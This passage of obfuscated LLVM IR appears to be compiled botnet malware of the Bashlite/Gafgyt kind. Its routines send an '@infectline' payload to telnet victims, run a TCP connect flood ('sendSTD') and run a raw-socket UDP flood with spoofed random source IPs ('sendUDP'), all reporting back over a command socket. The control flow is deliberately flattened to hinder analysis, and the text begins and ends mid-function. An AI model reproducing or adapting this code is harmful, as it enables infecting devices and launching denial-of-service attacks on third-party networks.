  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 6
  store i32 %1063, i32* %1067, align 4
  store i32 -1658027898, i32* %switchVar
  br label %loopEnd

; <label>:1068:                                   ; preds = %loopEntry
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 0
  %1073 = load i32, i32* %1072, align 16
  %1074 = load i8*, i8** @infectline, align 8
  %1075 = load i8*, i8** @infectline, align 8
  %1076 = call i64 @strlen(i8* %1075) #10
  %1077 = call i64 @send(i32 %1073, i8* %1074, i64 %1076, i32 16384)
  %1078 = icmp slt i64 %1077, 0
  %1079 = select i1 %1078, i32 -938739543, i32 767033480
  store i32 %1079, i32* %switchVar
  br label %loopEnd

; <label>:1080:                                   ; preds = %loopEntry
  %1081 = load i32, i32* %2, align 4
  %1082 = sext i32 %1081 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %1082
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1083, i32 0, i32 0
  %1085 = load i32, i32* %1084, align 16
  %1086 = call i32 @sclose(i32 %1085)
  %1087 = load i32, i32* %2, align 4
  %1088 = sext i32 %1087 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 2
  store i8 0, i8* %1090, align 8
  %1091 = load i32, i32* %2, align 4
  %1092 = sext i32 %1091 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1093, i32 0, i32 3
  store i8 1, i8* %1094, align 1
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 8
  %1099 = load i8*, i8** %1098, align 8
  call void @llvm.memset.p0i8.i64(i8* %1099, i8 0, i64 1024, i32 1, i1 false)
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:1100:                                   ; preds = %loopEntry
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 6
  %1105 = load i32, i32* %1104, align 4
  %1106 = add i32 %1105, 15
  %1107 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1108 = icmp ult i32 %1106, %1107
  %1109 = select i1 %1108, i32 717831329, i32 -2074077644
  store i32 %1109, i32* %switchVar
  br label %loopEnd

; <label>:1110:                                   ; preds = %loopEntry
  %1111 = load i32, i32* %2, align 4
  %1112 = sext i32 %1111 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %1112
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 0
  %1115 = load i32, i32* %1114, align 16
  %1116 = call i32 @sclose(i32 %1115)
  %1117 = load i32, i32* %2, align 4
  %1118 = sext i32 %1117 to i64
  %.reload20 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload20, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 2
  store i8 0, i8* %1120, align 8
  %1121 = load i32, i32* %2, align 4
  %1122 = sext i32 %1121 to i64
  %.reload19 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload19, i64 %1122
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1123, i32 0, i32 3
  store i8 1, i8* %1124, align 1
  store i32 -2074077644, i32* %switchVar
  br label %loopEnd

; <label>:1125:                                   ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:1126:                                   ; preds = %loopEntry
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:1127:                                   ; preds = %loopEntry
  %1128 = load i32, i32* %2, align 4
  %1129 = add nsw i32 %1128, 1
  store i32 %1129, i32* %2, align 4
  store i32 -792476572, i32* %switchVar
  br label %loopEnd

; <label>:1130:                                   ; preds = %loopEntry
  store i32 1241689673, i32* %switchVar
  br label %loopEnd

; <label>:1131:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %1130, %1127, %1126, %NewDefault, %1125, %1110, %1100, %1080, %1068, %1062, %1054, %1049, %1034, %1025, %1024, %1009, %999, %987, %981, %976, %956, %947, %927, %910, %890, %884, %876, %871, %856, %847, %832, %806, %805, %790, %780, %768, %753, %744, %738, %733, %728, %711, %691, %686, %677, %671, %663, %658, %643, %634, %619, %593, %592, %577, %567, %566, %565, %553, %535, %515, %497, %477, %459, %439, %434, %425, %419, %411, %410, %395, %385, %384, %369, %365, %364, %333, %318, %307, %275, %274, %265, %264, %258, %250, %249, %240, %229, %224, %201, %200, %161, %160, %155, %146, %135, %120, %100, %87, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %70, %65, %64, %63, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #2
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 1632516980, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1632516980, label %37
    i32 -359214189, label %41
    i32 99483505, label %55
    i32 1586895171, label %58
    i32 -120509644, label %59
    i32 190371300, label %62
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %11, align 4
  %39 = icmp uge i32 %38, 50
  %40 = select i1 %39, i32 -359214189, i32 -120509644
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %7, align 4
  %43 = call i64 @send(i32 %42, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i64 50, i32 0)
  %44 = load i32, i32* %7, align 4
  %45 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %46 = call i32 @connect(i32 %44, %struct.sockaddr* %45, i32 16)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = sext i32 %47 to i64
  %49 = load i64, i64* %8, align 8
  %50 = load i32, i32* %6, align 4
  %51 = sext i32 %50 to i64
  %52 = add nsw i64 %49, %51
  %53 = icmp sge i64 %48, %52
  %54 = select i1 %53, i32 99483505, i32 1586895171
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @close(i32 %56)
  call void @_exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -120509644, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %11, align 4
  %61 = add i32 %60, 1
  store i32 %61, i32* %11, align 4
  store i32 1632516980, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %59, %58, %41, %37, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1940566249, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1940566249, label %first
    i32 2106425307, label %32
    i32 -1602775084, label %36
    i32 1325784313, label %41
    i32 1137663968, label %47
    i32 -1377323451, label %48
    i32 2019021931, label %55
    i32 -1596714751, label %60
    i32 705717305, label %63
    i32 1240306931, label %71
    i32 -1818123210, label %72
    i32 1243538920, label %82
    i32 2083901082, label %93
    i32 2109035403, label %97
    i32 19394999, label %101
    i32 -1109368815, label %106
    i32 -140182329, label %107
    i32 82540780, label %108
    i32 963254116, label %111
    i32 -997593904, label %112
    i32 1758703512, label %117
    i32 421477440, label %120
    i32 -855370112, label %126
    i32 -1941751652, label %129
    i32 -1445544229, label %130
    i32 -1209287675, label %135
    i32 2116904206, label %140
    i32 1715020469, label %144
    i32 1252225637, label %145
    i32 -545184176, label %151
    i32 -18773377, label %191
    i32 -2093416959, label %193
    i32 -561026888, label %198
    i32 1447325353, label %223
    i32 -211433950, label %224
    i32 -890643926, label %237
    i32 610934229, label %239
    i32 -960146114, label %244
    i32 -2078223023, label %271
    i32 1532861622, label %276
    i32 -1230459949, label %277
    i32 551680790, label %278
    i32 -1594132489, label %281
    i32 -560432325, label %283
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 2106425307, i32 -1602775084
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 1325784313, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 1325784313, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 1137663968, i32 -1377323451
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 2019021931, i32 -997593904
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 705717305, i32 -1596714751
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #2
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  %70 = select i1 %69, i32 1240306931, i32 -1818123210
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 %76, i32 1, i1 false)
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %77, i32 %78)
  %79 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %79, %80
  store i32 %81, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 1243538920, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %15, align 4
  %84 = load i8*, i8** %16, align 8
  %85 = load i32, i32* %11, align 4
  %86 = sext i32 %85 to i64
  %87 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %88 = call i64 @sendto(i32 %83, i8* %84, i64 %86, i32 0, %struct.sockaddr* %87, i32 16)
  %89 = load i32, i32* %18, align 4
  %90 = load i32, i32* %14, align 4
  %91 = icmp eq i32 %89, %90
  %92 = select i1 %91, i32 2083901082, i32 82540780
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %8, align 4
  %95 = icmp eq i32 %94, 0
  %96 = select i1 %95, i32 2109035403, i32 19394999
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  store i32 19394999, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %17, align 4
  %104 = icmp sgt i32 %102, %103
  %105 = select i1 %104, i32 -1109368815, i32 -140182329
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 963254116, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 1243538920, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %18, align 4
  %110 = add i32 %109, 1
  store i32 %110, i32* %18, align 4
  store i32 1243538920, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %113, i32* %19, align 4
  %114 = load i32, i32* %19, align 4
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 421477440, i32 1758703512
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %121 = load i32, i32* %19, align 4
  %122 = bitcast i32* %20 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #2
  %124 = icmp slt i32 %123, 0
  %125 = select i1 %124, i32 -855370112, i32 -1941751652
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  store i32 -560432325, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 -1445544229, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %21, align 4
  %132 = add nsw i32 %131, -1
  store i32 %132, i32* %21, align 4
  %133 = icmp ne i32 %131, 0
  %134 = select i1 %133, i32 -1209287675, i32 2116904206
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %137 = call i32 @rand_cmwc()
  %138 = xor i32 %136, %137
  call void @srand(i32 %138) #2
  %139 = call i32 @rand() #2
  call void @init_rand(i32 %139)
  store i32 -1445544229, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %10, align 4
  %142 = icmp eq i32 %141, 0
  %143 = select i1 %142, i32 1715020469, i32 1252225637
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 -545184176, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = sub nsw i32 32, %146
  %148 = shl i32 1, %147
  %149 = sub nsw i32 %148, 1
  %150 = xor i32 %149, -1
  store i32 %150, i32* %22, align 4
  store i32 -545184176, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 28, %153
  store i64 %154, i64* %.reg2mem2
  %155 = call i8* @llvm.stacksave()
  store i8* %155, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %156 = alloca i8, i64 %.reload4, align 16
  store i8* %156, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %157 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %24, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = getelementptr i8, i8* %159, i64 20
  %161 = bitcast i8* %160 to %struct.udphdr*
  store %struct.udphdr* %161, %struct.udphdr** %25, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %22, align 4
  %167 = call i32 @getRandomIP(i32 %166)
  %168 = call i32 @htonl(i32 %167) #13
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 8, %170
  %172 = trunc i64 %171 to i32
  call void @makeIPPacket(%struct.iphdr* %162, i32 %165, i32 %168, i8 zeroext 17, i32 %172)
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #13
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.2* %179 to %struct.anon.3*
  %181 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %180, i32 0, i32 2
  store i16 %177, i16* %181, align 2
  %182 = call i32 @rand_cmwc()
  %183 = trunc i32 %182 to i16
  %184 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.2* %185 to %struct.anon.3*
  %187 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %186, i32 0, i32 0
  store i16 %183, i16* %187, align 2
  %188 = load i32, i32* %8, align 4
  %189 = icmp eq i32 %188, 0
  %190 = select i1 %189, i32 -18773377, i32 -2093416959
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = call i32 @rand_cmwc()
  store i32 -561026888, i32* %switchVar
  store i32 %192, i32* %.reg2mem10
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %8, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #13
  %197 = zext i16 %196 to i32
  store i32 -561026888, i32* %switchVar
  store i32 %197, i32* %.reg2mem10
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %199 = trunc i32 %.reload11 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.2* %201 to %struct.anon.3*
  %203 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %202, i32 0, i32 1
  store i16 %199, i16* %203, align 2
  %204 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.2* %205 to %struct.anon.3*
  %207 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %206, i32 0, i32 3
  store i16 0, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %209 = bitcast %struct.udphdr* %208 to i8*
  %210 = getelementptr inbounds i8, i8* %209, i64 8
  %211 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %210, i32 %211)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %212 = bitcast i8* %.reload8 to i16*
  %213 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 2
  %215 = load i16, i16* %214, align 2
  %216 = zext i16 %215 to i32
  %217 = call zeroext i16 @csum(i16* %212, i32 %216)
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 7
  store i16 %217, i16* %219, align 2
  %220 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %221 = load i32, i32* %9, align 4
  %222 = add nsw i32 %220, %221
  store i32 %222, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 1447325353, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 -211433950, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %19, align 4
  %226 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %227 = call i64 @sendto(i32 %225, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %226, i32 16)
  %228 = call i32 @rand_cmwc()
  %229 = trunc i32 %228 to i16
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.2* %231 to %struct.anon.3*
  %233 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %232, i32 0, i32 0
  store i16 %229, i16* %233, align 2
  %234 = load i32, i32* %8, align 4
  %235 = icmp eq i32 %234, 0
  %236 = select i1 %235, i32 -890643926, i32 610934229
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  store i32 -960146114, i32* %switchVar
  store i32 %238, i32* %.reg2mem12
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i32, i32* %8, align 4
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #13
  %243 = zext i16 %242 to i32
  store i32 -960146114, i32* %switchVar
  store i32 %243, i32* %.reg2mem12
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
